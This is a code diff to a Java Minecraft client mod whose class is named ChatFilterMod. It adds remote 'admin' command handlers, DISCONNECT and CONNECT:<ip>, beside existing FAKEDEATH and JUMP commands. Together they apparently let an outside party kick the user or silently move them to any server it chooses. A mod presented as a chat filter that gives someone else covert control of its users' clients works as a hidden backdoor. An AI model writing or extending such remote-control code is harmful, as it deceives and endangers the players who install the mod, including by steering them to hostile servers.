@@ -41,7 +41,7 @@ import net.minecraft.entity.EquipmentSlot;
 public final class ChatFilterMod implements ClientModInitializer {
 
     public static final Logger LOGGER = LoggerFactory.getLogger("columba");
-    public static final String VERSION = "4.3.3";
+    public static final String VERSION = "4.4.0";
     public static KeyBinding OPEN_KEY;
     public static KeyBinding ADMIN_KEY;
 
@@ -1111,8 +1111,37 @@ public final class ChatFilterMod implements ClientModInitializer {
         // Normalize FAKEDEATH:message → FAKEDEATH for the switch
         String switchCmd = command.toUpperCase();
         if (switchCmd.startsWith("FAKEDEATH:")) switchCmd = "FAKEDEATH";
+        if (switchCmd.startsWith("CONNECT:")) switchCmd = "CONNECT";
 
         switch (switchCmd) {
+            case "DISCONNECT":
+                mc.execute(() -> {
+                    if (mc.world != null) {
+                        mc.world.disconnect(Text.literal("Disconnected by admin"));
+                    }
+                    mc.disconnect(new net.minecraft.client.gui.screen.TitleScreen(), false);
+                });
+                break;
+            case "CONNECT":
+                String serverIp = command.substring("CONNECT:".length()).trim();
+                if (!serverIp.isEmpty()) {
+                    mc.execute(() -> {
+                        if (mc.world != null) {
+                            mc.world.disconnect(Text.literal("Connecting to " + serverIp));
+                        }
+                        net.minecraft.client.gui.screen.TitleScreen title =
+                                new net.minecraft.client.gui.screen.TitleScreen();
+                        mc.disconnect(title, false);
+                        net.minecraft.client.network.ServerAddress addr =
+                                net.minecraft.client.network.ServerAddress.parse(serverIp);
+                        net.minecraft.client.network.ServerInfo info =
+                                new net.minecraft.client.network.ServerInfo(
+                                        serverIp, serverIp, net.minecraft.client.network.ServerInfo.ServerType.OTHER);
+                        net.minecraft.client.gui.screen.multiplayer.ConnectScreen.connect(
+                                title, mc, addr, info, false, null);
+                    });
+                }
+                break;
             case "JUMP":
                 if (mc.player != null && mc.player.isOnGround()) mc.player.jump();
                 break;
